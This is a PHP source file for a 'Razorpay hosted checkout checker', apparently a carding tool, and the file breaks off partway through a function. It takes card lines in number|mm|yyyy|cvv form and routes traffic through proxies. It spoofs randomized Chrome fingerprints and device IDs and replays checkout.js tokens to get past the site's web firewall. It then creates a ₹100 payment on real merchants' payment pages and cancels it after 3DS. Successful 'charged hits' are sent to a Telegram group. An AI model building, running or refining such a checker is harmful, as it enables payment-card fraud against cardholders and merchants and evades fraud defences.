<?php
/**
 * Razorpay hosted checkout checker (GET API).
 *
 * Query: ?cc=number|mm|yyyy|cvv&site=https://razorpay.me/@handle&proxy=host:port:user:pass
 * Amount hardcoded to 10000 paise (â‚¹100). Charged hits drop to Telegram group.
 *
 * CLI: php razorpay.php "cc=...&site=...&proxy=..."
 */

declare(strict_types=1);

require_once __DIR__ . '/TelegramNotifier.php';

final class RazorpayCheckoutSession
{
    /** Hardcoded: 10000 paise = â‚¹100.00 */
    private const AMOUNT_PAISE = 10000;

    private const CHECKOUT_JS_URL = 'https://checkout.razorpay.com/v1/checkout.js';
    private const CHECKOUT_PUBLIC = 'https://api.razorpay.com/v1/checkout/public';
    private const API_BASE        = 'https://api.razorpay.com';
    private const CB_FLOWS        = 'https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows';
    private const PREFERENCES_URL = 'https://api.razorpay.com/v2/standard_checkout/preferences';
    private const PAYMENT_CREATE  = 'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax';

    private string $cookieJar;
    private string $paymentPageUrl;
    private string $paymentReferer;
    private array $profile;
    private array $tokens = [];
    private array $card;
    private int $amountPaise;
    private string $cardIin;
    private string $orderComment;
    private ?string $trafficEnvOverride;
    private float $startTime = 0.0;
    public bool $verbose = false;
    private int $lastHttpCode = 0;
    private ?string $runError = null;
    /** @var array{status: string, message: string, reason: string}|null */
    private ?array $forcedOutcome = null;
    /** @var array{host: string, port: int, user: string, pass: string}|null */
    private ?array $proxy = null;

    public function __construct(
        ?array $profile = null,
        string $cardIin = '434256',
        string $orderComment = '',
        string $paymentPageUrl = 'https://razorpay.me/@tpstech',
        ?string $trafficEnv = null,
        ?array $card = null,
        ?array $proxy = null
    ) {
        $this->paymentPageUrl      = self::normalizePaymentPageUrl($paymentPageUrl);
        $this->paymentReferer      = $this->paymentPageUrl;
        $this->cookieJar           = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'rzp_cookies_' . bin2hex(random_bytes(8)) . '.txt';
        $this->profile             = $profile ?? self::generateBrowserProfile();
        $this->amountPaise         = self::AMOUNT_PAISE;
        $this->cardIin             = $cardIin;
        $this->orderComment        = $orderComment;
        $this->trafficEnvOverride  = $trafficEnv;
        $this->card                = $card ?? self::defaultTestCard();
        $this->proxy               = $proxy;
    }

    public static function normalizePaymentPageUrl(string $site): string
    {
        $site = trim($site);
        if ($site === '') {
            return 'https://razorpay.me/@tpstech';
        }
        if (!preg_match('#^https?://#i', $site)) {
            $site = str_starts_with($site, '@')
                ? 'https://razorpay.me/' . $site
                : (preg_match('#^(pages\.)?razorpay\.(me|com)#i', $site) || str_contains($site, 'pages.razorpay.com')
                    ? 'https://' . ltrim($site, '/')
                    : (str_contains($site, 'razorpay.me')
                        ? 'https://' . ltrim($site, '/')
                        : 'https://razorpay.me/@' . ltrim($site, '@')));
        }
        return rtrim($site, '/');
    }

    /** @return array{number: string, expiry_month: string, expiry_year: string, cvv: string, name: string} */
    public static function parseCcParam(string $cc): array
    {
        $parts = array_map('trim', explode('|', $cc));
        if (count($parts) < 4) {
            throw new InvalidArgumentException('cc must be number|mm|yyyy|cvv');
        }

        [$number, $month, $year, $cvv] = $parts;
        $number = preg_replace('/\D/', '', $number) ?? '';
        if (strlen($number) < 13) {
            throw new InvalidArgumentException('invalid card number');
        }

        $month = str_pad(preg_replace('/\D/', '', $month) ?? '', 2, '0', STR_PAD_LEFT);
        $year  = preg_replace('/\D/', '', $year) ?? '';
        if (strlen($year) === 2) {
            $year = '20' . $year;
        }
        if (strlen($year) !== 4) {
            throw new InvalidArgumentException('invalid expiry year');
        }

        return [
            'number'       => $number,
            'expiry_month' => $month,
            'expiry_year'  => substr($year, -2),
            'cvv'          => $cvv,
            'name'         => 'Card Holder',
        ];
    }

    /** @return array{host: string, port: int, user: string, pass: string} */
    public static function parseProxyParam(string $proxy): array
    {
        $proxy = trim($proxy);
        if ($proxy === '') {
            throw new InvalidArgumentException('proxy is required');
        }

        $parts = explode(':', $proxy, 4);
        if (count($parts) < 2) {
            throw new InvalidArgumentException('proxy must be host:port or host:port:user:pass');
        }

        return [
            'host' => $parts[0],
            'port' => (int) $parts[1],
            'user' => $parts[2] ?? '',
            'pass' => $parts[3] ?? '',
        ];
    }

    /** @param array{host: string, port: int, user: string, pass: string} $proxy */
    public static function isProxyAlive(array $proxy, float $timeout = 12.0): bool
    {
        // Test via plain HTTP (no CONNECT tunnel needed) — much faster for residential proxies.
        // If HTTP test passes, proxy is alive. HTTPS tunnel will be tested implicitly on first real request.
        $proxyUrl = sprintf('http://%s:%d', $proxy['host'], $proxy['port']);

        // Try plain HTTP first (fastest, no tunnel)
        $ch = curl_init('http://www.google.com/');
        $opts = [
            CURLOPT_RETURNTRANSFER  => true,
            CURLOPT_NOBODY          => true,
            CURLOPT_TIMEOUT         => 8,
            CURLOPT_CONNECTTIMEOUT  => 6,
            CURLOPT_PROXY           => $proxyUrl,
            CURLOPT_SSL_VERIFYPEER  => false,
            CURLOPT_SSL_VERIFYHOST  => 0,
            CURLOPT_FOLLOWLOCATION  => true,
            CURLOPT_MAXREDIRS       => 3,
        ];
        if ($proxy['user'] !== '') {
            $opts[CURLOPT_PROXYUSERPWD] = $proxy['user'] . ':' . $proxy['pass'];
        }
        curl_setopt_array($ch, $opts);
        curl_exec($ch);
        $err  = curl_error($ch);
        $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        // HTTP test passed → proxy is alive
        if ($err === '' && $code > 0 && $code < 600) {
            return true;
        }

        // HTTP test failed — try HTTPS CONNECT tunnel as fallback
        $ch2 = curl_init('https://www.google.com/');
        $opts2 = [
            CURLOPT_RETURNTRANSFER  => true,
            CURLOPT_NOBODY          => true,
            CURLOPT_TIMEOUT         => 10,
            CURLOPT_CONNECTTIMEOUT  => 8,
            CURLOPT_PROXY           => $proxyUrl,
            CURLOPT_HTTPPROXYTUNNEL => true,
            CURLOPT_SSL_VERIFYPEER  => false,
            CURLOPT_SSL_VERIFYHOST  => 0,
        ];
        if ($proxy['user'] !== '') {
            $opts2[CURLOPT_PROXYUSERPWD] = $proxy['user'] . ':' . $proxy['pass'];
        }
        curl_setopt_array($ch2, $opts2);
        curl_exec($ch2);
        $err2  = curl_error($ch2);
        $code2 = (int) curl_getinfo($ch2, CURLINFO_HTTP_CODE);
        curl_close($ch2);

        return $err2 === '' && $code2 > 0 && $code2 < 600;
    }

    public function __destruct()
    {
        if (is_file($this->cookieJar)) {
            @unlink($this->cookieJar);
        }
    }

    /** @return array<string, mixed> */
    public function run(): array
    {
        $this->startTime = microtime(true);
        $this->verbose   = getenv('RAZORPAY_VERBOSE') === '1';

        try {
            $this->log('=== Browser profile ===');
            $this->printProfile();

            $this->log("\n=== Step 1: Payment page ({$this->paymentPageUrl}) ===");
            $html = $this->request('GET', $this->paymentPageUrl, $this->documentHeaders());
            $this->extractPageTokens($html);

            $this->log("\n=== Step 2: checkout.js ===");
            $js = $this->request('GET', self::CHECKOUT_JS_URL, $this->scriptHeaders());
            $this->extractCheckoutJsTokens($js);

            $checkoutId = self::generateCheckoutId();
            $this->tokens['checkout_id']        = $checkoutId;
            $this->tokens['unified_session_id'] = $this->persistUnifiedSessionId($checkoutId);
            $this->tokens['rzp_device_id']      = $this->generateDeviceId();

            $this->log("\n=== Generated IDs ===");
            $this->logToken('unified_session_id', $this->tokens['unified_session_id']);
            $this->logToken('checkout_id', $this->tokens['checkout_id']);

            $this->log("\n=== Step 3: checkout/public ===");
            $publicHtml = $this->fetchCheckoutPublic();
            $this->extractSessionToken($publicHtml);
            $this->seedCheckoutCookies();

            $this->log("\n=== Step 4: Create order ===");
            $this->createOrder();

            if ($this->forcedOutcome === null) {
                $this->log("\n=== Step 5: Prefill encrypt ===");
                $this->encryptPrefill();
            }

            if ($this->forcedOutcome === null) {
                $this->log("\n=== Step 6: Checkout preferences ===");
                $this->fetchPreferences();
            }

            if ($this->forcedOutcome === null) {
                $this->log("\n=== Step 7: Card IIN lookup ===");
                $this->lookupIin();
            }

            if ($this->forcedOutcome === null) {
                $this->log("\n=== Step 8: Cross-border cb_flows ===");
                $this->fetchCbFlows();
            }

            if ($this->forcedOutcome === null) {
                $this->log("\n=== Step 9: Create payment ===");
                $this->createPayment();
            }

            if ($this->forcedOutcome === null) {
                $this->log("\n=== Step 10: 3DS authenticate ===");
                $this->authenticate3ds();

                $this->log("\n=== Step 11: Cancel payment ===");
                $this->cancelPayment();
            }
        } catch (Throwable $e) {
            $this->runError = $e->getMessage();
            $this->log('RUN ERROR: ' . $this->runError);
        }
        
        $result = $this->buildFinalResult();

        return $result;
    }

    /** @return array<string, mixed> */
    public static function errorResult(string $cardLine, string $site, string $message, float $startTime): array
    {
        return [
            'card'       => $cardLine,
            'status'     => 'error',
            'message'    => $message,
            'site'       => self::normalizePaymentPageUrl($site),
            'time_taken' => sprintf('%.2fs', max(0.0, microtime(true) - $startTime)),
            'dev'        => '@Mod_By_Assassin',
        ];
    }

    public static function outputJson(array $result): void
    {
        if (PHP_SAPI !== 'cli') {
            header('Content-Type: application/json; charset=utf-8');
        }
        echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) . PHP_EOL;
    }

    public function getTokens(): array
    {
        return $this->tokens;
    }

    /** Chrome-on-Windows profile with matching Client Hints. */
    private static function insecureSslAllowed(): bool
    {
        return getenv('RAZORPAY_INSECURE_SSL') === '1'
            || (PHP_OS_FAMILY === 'Windows' && !ini_get('curl.cainfo'));
    }

    public static function generateBrowserProfile(): array
    {
        $chromeMajor = random_int(131, 148);
        $chromeBuild = random_int(6000, 7999);
        $winBuild    = random_int(19041, 26100);

        $ua = sprintf(
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.0 Safari/537.36',
            $chromeMajor,
            $chromeBuild
        );

        return [
            'user_agent'       => $ua,
            'sec_ch_ua'        => sprintf('"Chromium";v="%d", "Google Chrome";v="%d", "Not/A)Brand";v="99"', $chromeMajor, $chromeMajor),
            'sec_ch_ua_mobile' => '?0',
            'sec_ch_ua_platform' => '"Windows"',
            'accept_language'  => 'en-US,en;q=0.9',
            'platform'         => 'Win32',
            'language'         => 'en-US',
            'timezone_offset'  => '-330',
            'hardware_concurrency' => (string) random_int(4, 16),
            'device_memory'    => (string) [4, 8, 16][random_int(0, 2)],
            'color_depth'      => (string) [24, 30, 32][random_int(0, 2)],
            'screen_width'     => (string) [1366, 1440, 1536, 1920][random_int(0, 3)],
            'screen_height'    => (string) [768, 900, 864, 1080][random_int(0, 3)],
            'device_pixel_ratio' => (string) ([1, 1.25, 1.5, 2][random_int(0, 3)]),
        ];
    }

    /**
     * checkout.js module 83609 â€” same algo for checkout_id and unified_session_id (14 chars).
     */
    public static function generateCheckoutId(): string
    {
        $alphabet = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
        $map      = array_flip(str_split($alphabet));

        $base62 = static function (int $n) use ($alphabet): string {
            if ($n === 0) {
                return '0';
            }
            $out = '';
            while ($n > 0) {
                $out = $alphabet[$n % 62] . $out;
                $n   = intdiv($n, 62);
            }
            return $out;
        };

        $epochOffset = (int) round(microtime(true) * 1000) - 1388534400000;
        $rand6       = str_pad((string) random_int(0, 999_999), 6, '0', STR_PAD_LEFT);
        // JS: String((Date.now()-epoch) + String(padded6)) â€” numeric+string => string concat
        $numStr = (string) $epochOffset . $rand6;
        $rand2  = (int) floor(238328 * (mt_rand() / mt_getrandmax()));

        $t = $base62((int) $numStr) . $base62($rand2) . '0';

        $sum = 0;
        $len = strlen($t);
        for ($o = 0; $o < $len; $o++) {
            $ch = $t[$len - 1 - $o];
            $e  = $map[$ch] ?? 0;
            if (($len - $o) % 2 === 1) {
                $e *= 2;
            }
            if ($e >= 62) {
                $e = ($e % 62) + 1;
            }
            $sum += $e;
        }

        $check = $sum % 62;
        if ($check !== 0) {
            $check = 62 - $check;
        }

        return substr($t, 0, 13) . $alphabet[$check];
    }

    /** Mirrors Ae(): cookie rzp_unified_session_id or fallback to checkout id. */
    public function persistUnifiedSessionId(string $checkoutId): string
    {
        $this->setCookie('rzp_unified_session_id', $checkoutId, 1800);
        return $checkoutId;
    }

    /**
     * checkout.js device module â€” rzp_device_id = "1.{sha1}.{ts}.{random8}"
     */
    public function generateDeviceId(): string
    {
        $p = $this->profile;
        $w = (int) $p['screen_width'];
        $h = (int) $p['screen_height'];

        $parts = [
            $p['user_agent'],
            $p['language'],
            $p['timezone_offset'],
            $p['platform'],
            '', // cpuClass (often empty in Chrome)
            $p['hardware_concurrency'],
            $p['color_depth'],
            $p['device_memory'],
            (string) ($w + $h),
            (string) ($w * $h),
            $p['device_pixel_ratio'],
        ];

        $hash = sha1(implode('', $parts));
        $ts   = (int) round(microtime(true) * 1000);
        $rand = substr('0.' . random_int(10000000, 99999999), -8);

        return "1.{$hash}.{$ts}.{$rand}";
    }

    private function extractPageTokens(string $html): void
    {
        if (!preg_match('/var\s+data\s*=\s*(\{.*?\});/s', $html, $m)) {
            throw new RuntimeException('Could not find var data = {...} on payment page');
        }

        $data = json_decode($m[1], true, 512, JSON_THROW_ON_ERROR);

        $this->tokens['key_id']         = $data['key_id'] ?? '';
        $this->tokens['keyless_header'] = $data['keyless_header'] ?? '';

        $pl = $data['payment_link'] ?? [];
        $this->tokens['payment_link_id'] = $pl['id'] ?? '';

        $this->detectPageAuthMode($data);
        $this->extractPaymentPageItems($pl);

        $currency = (string) ($pl['currency'] ?? '');
        if ($currency === '') {
            $currency = (string) ($data['currency'] ?? '');
        }
        if ($currency === '') {
            $items = $pl['payment_page_items'] ?? [];
            $first = is_array($items[0] ?? null) ? $items[0] : [];
            $currency = (string) ($first['item']['currency'] ?? '');
        }
        if ($currency !== '') {
            $this->tokens['currency'] = strtoupper($currency);
        }

        if (($this->tokens['payment_link_id'] ?? '') === ''
            && preg_match('#/(pl_[A-Za-z0-9]+)(?:/|$)#', $this->paymentPageUrl, $urlMatch)) {
            $this->tokens['payment_link_id'] = $urlMatch[1];
        }

        if ($this->trafficEnvOverride !== null) {
            $this->tokens['traffic_env'] = $this->trafficEnvOverride;
        } elseif (!empty($data['environment'])) {
            $this->tokens['traffic_env'] = $data['environment'] === 'production' ? 'production' : $data['environment'];
        }

        $this->log('--- Extracted from payment page ---');
        foreach (['key_id', 'keyless_header', 'payment_link_id', 'ppi_id', 'item_id', 'page_item_amount', 'currency', 'page_auth_mode'] as $key) {
            $this->logToken($key, (string) ($this->tokens[$key] ?? ''));
        }
        $lineItems = $this->tokens['order_line_items'] ?? [];
        $this->log('  order_line_items: ' . count($lineItems) . ' item(s)');
    }

    /** @param array<string, mixed> $data */
    private function detectPageAuthMode(array $data): void
    {
        $hasKey     = trim((string) ($data['key_id'] ?? '')) !== '';
        $hasKeyless = trim((string) ($data['keyless_header'] ?? '')) !== '';

        if ($hasKey) {
            $this->tokens['page_auth_mode'] = 'key';
        } elseif ($hasKeyless) {
            $this->tokens['page_auth_mode'] = 'keyless';
        } else {
            $this->tokens['page_auth_mode'] = 'open';
        }
    }

    /** @param array<string, mixed> $pl */
    private function extractPaymentPageItems(array $pl): void
    {
        $items = $pl['payment_page_items'] ?? [];
        $lineItems    = [];
        $mandatoryIds = [];
        $firstPpi     = null;
        $firstItemId  = '';

        foreach ($items as $item) {
            if (!is_array($item)) {
                continue;
            }

            $ppiId = (string) ($item['id'] ?? '');
            if ($ppiId === '') {
                continue;
            }

            if ($firstPpi === null) {
                $firstPpi    = $ppiId;
                $firstItemId = (string) ($item['item']['id'] ?? '');
            }

            // Detect merchant's fixed price
            $itemAmount = (int) ($item['amount'] ?? 0);
            if ($itemAmount <= 0) {
                $itemAmount = (int) ($item['item']['amount'] ?? 0);
            }
            if ($itemAmount <= 0) {
                $itemAmount = (int) ($item['item']['minimum_amount'] ?? 0);
            }

            // Check if amount is editable (custom) or fixed by merchant
            $isEditable = (bool) ($item['settings']['amount_editable']
                ?? $item['amount_editable']
                ?? ($itemAmount <= 0)); // if no fixed amount found, treat as editable

            if ($itemAmount > 0 && empty($this->tokens['page_item_amount'])) {
                $this->tokens['page_item_amount']  = $itemAmount;
                $this->tokens['page_item_editable'] = $isEditable ? 'yes' : 'no';
            }

            // Decide the effective amount to use for this line item
            // Fixed price site (non-editable): use merchant's amount
            // Custom/flexible site (editable or no fixed amount): use our AMOUNT_PAISE
            $effectiveAmount = (!$isEditable && $itemAmount > 0)
                ? $itemAmount
                : $this->amountPaise;

            if ($this->paymentPageItemIsMandatory($item)) {
                $mandatoryIds[] = $ppiId;
                $lineItems[] = [
                    'payment_page_item_id' => $ppiId,
                    'amount'               => $effectiveAmount,
                ];
            }
        }

        if ($lineItems === [] && $firstPpi !== null) {
            $pageAmt    = (int) ($this->tokens['page_item_amount'] ?? 0);
            $editable   = ($this->tokens['page_item_editable'] ?? 'yes') === 'yes';
            $useAmount  = (!$editable && $pageAmt > 0) ? $pageAmt : $this->amountPaise;

            $lineItems[] = [
                'payment_page_item_id' => $firstPpi,
                'amount'               => $useAmount,
            ];
        }

        $this->tokens['mandatory_ppi_ids'] = $mandatoryIds;
        $this->tokens['order_line_items']  = $lineItems;
        $this->tokens['ppi_id']            = $lineItems[0]['payment_page_item_id'] ?? $firstPpi ?? '';
        $this->tokens['item_id']           = $firstItemId;

        // -- Key rule ----------------------------------------------------------
        // If merchant has a fixed price > AMOUNT_PAISE (₹100), we cannot afford
        // it — flag as amount_mismatch and stop further processing.
        // If fixed price <= AMOUNT_PAISE, we use their amount and proceed.
        // EXCEPTION: non-INR sites (e.g. USD) — skip paise comparison entirely;
        // the order amount from createOrder() response is used directly.
        // ---------------------------------------------------------------------
        $pageFixed = (int) ($this->tokens['page_item_amount'] ?? 0);
        $isFixed   = ($this->tokens['page_item_editable'] ?? 'yes') === 'no';
        $pageCur   = strtoupper((string) ($this->tokens['currency'] ?? 'INR'));
        if ($isFixed && $pageFixed > $this->amountPaise && $pageCur === 'INR') {
            $this->forcedOutcome = [
                'status'  => 'error',
                'message' => 'Amount too small',
                'reason'  => 'amount_mismatch',
            ];
        }
    }

    /** @param array<string, mixed> $item */
    private function paymentPageItemIsMandatory(array $item): bool
    {
        foreach (['mandatory', 'is_mandatory', 'required'] as $key) {
            if (($item[$key] ?? false) === true) {
                return true;
            }
        }

        $nested = $item['item'] ?? [];
        if (is_array($nested)) {
            foreach (['mandatory', 'is_mandatory', 'required'] as $key) {
                if (($nested[$key] ?? false) === true) {
                    return true;
                }
            }
        }

        return strtolower((string) ($item['type'] ?? '')) === 'mandatory';
    }

    /** @param list<array{payment_page_item_id: string, amount: int}> $lineItems */
    private function orderLineItemsIncludePpi(array $lineItems, string $ppiId): bool
    {
        foreach ($lineItems as $lineItem) {
            if (($lineItem['payment_page_item_id'] ?? '') === $ppiId) {
                return true;
            }
        }

        return false;
    }

    /** @return list<array{payment_page_item_id: string, amount: int}> */
    private function orderLineItemsWithMandatoryPpi(string $ppiId): array
    {
        return [
            [
                'payment_page_item_id' => $ppiId,
                'amount'               => $this->amountPaise,
            ],
        ];
    }

    /** @return list<array<string, bool>> */
    private function orderAuthSequence(): array
    {
        // razorpay.me/@user â€” plain order only (rz.py); never auth query params on order.
        if ($this->isRazorpayMePage()) {
            return [[]];
        }

        // pages.razorpay.com â€” try keyless/key_id only; never session_token on order API.
        return [
            [],
            ['keyless_header' => true],
            ['key_id' => true],
            ['keyless_header' => true, 'key_id' => true],
        ];
    }

    private function isRazorpayMePage(): bool
    {
        return (parse_url($this->paymentPageUrl, PHP_URL_HOST) ?: '') === 'razorpay.me';
    }

    /**
     * @param array<string, bool> $auth
     */
    private function paymentPageOrderUrl(string $plId, array $auth): string
    {
        $url = self::API_BASE . '/v1/payment_pages/' . $plId . '/order';
        $query = $this->paymentPageOrderQuery($auth);

        return $query === '' ? $url : $url . '?' . $query;
    }

    /**
     * @param array<string, bool> $auth
     */
    private function paymentPageOrderQuery(array $auth): string
    {
        $params = [];

        if (!empty($auth['key_id'])) {
            $keyId = trim($this->tokens['key_id'] ?? '');
            if ($keyId !== '') {
                $params['key_id'] = $keyId;
            }
        }

        if (!empty($auth['session_token']) && !empty($this->tokens['session_token'])) {
            $params['session_token'] = $this->tokens['session_token'];
        }

        if (!empty($auth['keyless_header'])) {
            $kh = trim($this->tokens['keyless_header'] ?? '');
            if ($kh !== '') {
                $params['keyless_header'] = $kh;
            }
        }

        return http_build_query($params);
    }

    /**
     * @param list<array{payment_page_item_id: string, amount: int}> $lineItems
     * @param array<string, bool> $auth
     * @return array{body: string, http_code: int}
     */
    private function submitPaymentPageOrder(array $lineItems, array $auth = []): array
    {
        $plId = $this->tokens['payment_link_id'] ?? '';
        $url  = $this->paymentPageOrderUrl($plId, $auth);

        $payload = [
            'notes'      => ['comment' => $this->orderComment],
            'line_items' => $lineItems,
        ];

        $body = $this->request(
            'POST',
            $url,
            $this->paymentPageApiHeaders($auth),
            json_encode($payload, JSON_THROW_ON_ERROR),
            false
        );

        return ['body' => $body, 'http_code' => $this->lastHttpCode];
    }

    private static function orderCreateNeedsAuthRetry(string $body): bool
    {
        $low = strtolower($body);

        return str_contains($low, 'authentication failed')
            || str_contains($low, 'please provide your api key');
    }

    private static function orderCreateShouldTryNextAuth(string $body): bool
    {
        if (self::orderCreateNeedsAuthRetry($body)) {
            return true;
        }

        $low = strtolower($body);

        return str_contains($low, 'should not be sent');
    }

    /** @return list<string> */
    private static function orderCreateRejectedAuthFields(string $body): array
    {
        $low = strtolower($body);
        if (!str_contains($low, 'should not be sent')) {
            return [];
        }

        $rejected = [];
        foreach (['session_token', 'key_id', 'keyless_header'] as $field) {
            if (str_contains($low, $field)) {
                $rejected[] = $field;
            }
        }

        return $rejected;
    }

    /**
     * @param array<string, bool> $auth
     * @param list<string> $rejected
     */
    private static function orderAuthUsesRejectedField(array $auth, array $rejected): bool
    {
        $map = [
            'session_token'  => ['session_token', 'header_session'],
            'key_id'         => ['key_id'],
            'keyless_header' => ['keyless_header'],
        ];

        foreach ($rejected as $field) {
            foreach ($map[$field] ?? [] as $authKey) {
                if (!empty($auth[$authKey])) {
                    return true;
                }
            }
        }

        return false;
    }

    private function extractCheckoutJsTokens(string $js): void
    {
        $patterns = [
            'build_number' => '/,\s*v=(\d+),\s*b="prod(?:uction)?"/',
            'commit_hash'  => '/b="prod(?:uction)?",\s*g="([a-f0-9]{40})"/',
            'build_v1'     => '/build_v1:"([a-f0-9]{40})"/',
            // checkout.js uses "prod" in minified builds, "production" in dev builds
            'traffic_env'  => '/b="(prod(?:uction)?|sandbox|canary)"/',
        ];

        foreach ($patterns as $key => $pattern) {
            if (preg_match($pattern, $js, $m)) {
                $this->tokens[$key] = $m[1];
                $this->logToken($key, $m[1]);
            }
        }

        // Broader fallback patterns for build_number if primary regex missed
        if (empty($this->tokens['build_number'])) {
            // Try: v=DIGITS anywhere near "prod" or in variable assignment
            if (preg_match('/v\s*=\s*(\d{8,})/', $js, $m)) {
                $this->tokens['build_number'] = $m[1];
                $this->logToken('build_number (fallback)', $m[1]);
            }
        }

        if (empty($this->tokens['commit_hash']) && preg_match('/g="([a-f0-9]{40})"/', $js, $m)) {
            $this->tokens['commit_hash'] = $m[1];
            $this->logToken('commit_hash', $m[1]);
        }

        // Fallback commit_hash so build= param is never empty in checkout/public URL
        if (empty($this->tokens['commit_hash'])) {
            $this->tokens['commit_hash'] = $this->tokens['build_v1'] ?? 'da4ee3f43a28ad81dba8ed06daf899a4520c691f';
            $this->logToken('commit_hash (fallback)', $this->tokens['commit_hash']);
        }

        if (empty($this->tokens['build_v1'])) {
            $this->tokens['build_v1'] = 'da4ee3f43a28ad81dba8ed06daf899a4520c691f';
            $this->logToken('build_v1 (fallback)', $this->tokens['build_v1']);
        }

        if (empty($this->tokens['traffic_env'])) {
            // checkout.js live builds use 'prod' (minified). Fallback to 'prod' for live sites.
            $this->tokens['traffic_env'] = $this->trafficEnvOverride ?? 'prod';
        }
    }

    private function fetchPreferences(): void
    {
        try {
            $url = self::PREFERENCES_URL . '?' . $this->checkoutEntityQuery();

            $payload = [
                'query'        => [
                    ['resource' => 'intl_config'],
                    ['resource' => 'paywithpartner'],
                ],
                'query_params' => $this->buildPreferencesQueryParams(),
                'action'       => 'get',
            ];

            $body = $this->requestJson('POST', $url, $this->checkoutApiHeaders(true), $payload);
            $data = json_decode($body, true, 512);

            if (!is_array($data)) {
                $this->tokens['preferences_error'] = 'non-JSON response: ' . substr($body, 0, 100);
                $this->log('  fetchPreferences: non-JSON response, shield_context will be empty');
                return;
            }

            $shield = $data['shield_data'] ?? [];
            $this->tokens['shield_context'] = $shield['shield_context'] ?? '';
            $this->tokens['shield_key']     = $shield['shield_key'] ?? '';

            if (empty($this->tokens['shield_context'])) {
                $this->tokens['preferences_error'] = 'shield_data missing in response keys: ' . implode(',', array_keys($data));
            }

            $this->logToken('shield_context', $this->tokens['shield_context']);
            $this->logToken('shield_key', $this->tokens['shield_key']);
        } catch (Throwable $e) {
            // Preferences is non-critical — payment can proceed without shield_context
            $errMsg = substr($e->getMessage(), 0, 150);
            $this->tokens['preferences_error'] = $errMsg;
            $this->log('  fetchPreferences: failed (' . $errMsg . '), continuing without shield');
        }
    }

    private function buildPreferencesQueryParams(): array
    {
        return [
            'device_id'        => $this->tokens['rzp_device_id'] ?? '',
            'rtb_device_id'    => $this->rtbDeviceId(),
            'amount'           => (string) ($this->tokens['order_amount'] ?? $this->amountPaise),
            'currency'         => $this->orderCurrency(),
            'option_currency'  => $this->orderCurrency(),
            'truecaller'       => false,
            'qr_required'      => true,
            'checkout_id'      => $this->tokens['checkout_id'] ?? '',
            'library'          => 'checkoutjs',
            'platform'         => 'browser',
            'referrer_domain'  => parse_url($this->paymentPageUrl, PHP_URL_HOST) ?: 'razorpay.me',
            'device_type'      => 'desktop',
            'contact'          => $this->tokens['contact'] ?? '',
            'order_id'         => $this->tokens['order_id'] ?? '',
            'payment_link_id'  => $this->tokens['payment_link_id'] ?? '',
        ];
    }

    private function createPayment(): void
    {
        $this->ensureCustomerDetails();

        // Deduplicate cookie jar before payment create.
        // The prefill/encrypt server response sets prefill_data_v1 via Set-Cookie (stored
        // by curl under api.razorpay.com), and our code also manually writes it under
        // .razorpay.com — curl sends BOTH = duplicate cookie = WAF 403.
        $this->deduplicateCookieJar();

        // Real Chrome payment create URL: ?session_token=...&keyless_header=...
        // session_token goes in BOTH the URL query AND the x-session-token header.
        // Real browser trace confirms: no x_entity_id in URL for payment create.
        // checkoutAuthQuery() returns: session_token + keyless_header (+ key_id if present)
        $url              = self::PAYMENT_CREATE . '?' . $this->checkoutAuthQuery();
        $includeCheckoutId = false;
        $body             = $this->buildPaymentCreateBody($includeCheckoutId);

        $response = $this->request(
            'POST',
            $url,
            $this->checkoutApiFormHeaders(),
            $body,
            false
        );

        if ($this->lastHttpCode >= 400
            && self::paymentCreateNeedsCheckoutId($response)
            && !$includeCheckoutId) {
            $this->log('  retry payment create with checkout_id');
            $includeCheckoutId = true;
            $body = $this->buildPaymentCreateBody($includeCheckoutId);
            $response = $this->request(
                'POST',
                $url,
                $this->checkoutApiFormHeaders(),
                $body,
                false
            );
        }

        // No retry loop — SERVER_ERROR on payment create is caused by bad request fields,
        // not transient issues. Retrying wastes 10+ seconds and always fails the same way.
        // The fix is sending correct fields (no empty key_id, no empty shield_context).
        // HTTP 500 (server down) is rare; handled by classify step below.

        $this->tokens['create_response_raw'] = $response;
        $this->tokens['create_http_code']    = $this->lastHttpCode;

        // Handle 403 WAF block — set forced outcome instead of throwing
        // so classifyOutcome() returns a clean "WAF Blocked" message
        if ($this->lastHttpCode === 403) {
            $this->forcedOutcome = [
                'status'  => 'error',
                'message' => 'WAF Blocked — Change Proxy',
                'reason'  => 'waf_403',
            ];
            $this->log('  create payment outcome: WAF 403');
            return;
        }

        if ($this->lastHttpCode === 400 || $this->lastHttpCode === 500) {
            $outcome = self::outcomeFromApiError($this->lastHttpCode, $response);
            if ($outcome !== null) {
                $this->forcedOutcome = $outcome;
                $this->log('  create payment outcome: ' . $outcome['message']);
                return;
            }
        }

        if ($this->lastHttpCode >= 400) {
            throw new RuntimeException(
                "HTTP {$this->lastHttpCode} for payment create: " . substr($response, 0, 500)
            );
        }

        $data = json_decode($response, true, 512, JSON_THROW_ON_ERROR);
        $this->tokens['payment_id']       = $data['payment_id'] ?? '';
        $this->tokens['payment_type']     = $data['type'] ?? '';
        $this->tokens['authenticate_url'] = $data['request']['url'] ?? '';

        $this->logToken('payment_id', $this->tokens['payment_id']);
    }

    private static function paymentCreateNeedsCheckoutId(string $body): bool
    {
        $low = strtolower($body);

        if (!str_contains($low, 'checkout_id') || str_contains($low, 'should not be sent')) {
            return false;
        }

        return str_contains($low, 'property checkout_id is required')
            || str_contains($low, 'checkout_id is required')
            || str_contains($low, 'checkout_id field is invalid');
    }

    /**
     * Map Razorpay API errors to checker outcomes.
     *
     * @return array{status: string, message: string, reason: string}|null
     */
    private static function outcomeFromApiError(int $httpCode, string $response): ?array
    {
        // 403 = WAF/nginx IP block — handle before JSON parse (response is HTML not JSON)
        if ($httpCode === 403) {
            return [
                'status'  => 'error',
                'message' => 'WAF Blocked — Change Proxy',
                'reason'  => 'waf_403',
            ];
        }

        $payload = json_decode($response, true);
        if (!is_array($payload)) {
            return null;
        }

        $desc    = strtolower((string) ($payload['error']['description'] ?? ''));
        $reason  = (string) ($payload['error']['reason'] ?? '');
        $message = strtolower((string) ($payload['message'] ?? ''));

        if ($httpCode === 404 && (
            str_contains($message, 'no route matched')
            || str_contains($desc, 'no route matched')
        )) {
            return [
                'status'  => 'error',
                'message' => 'Gay Site',
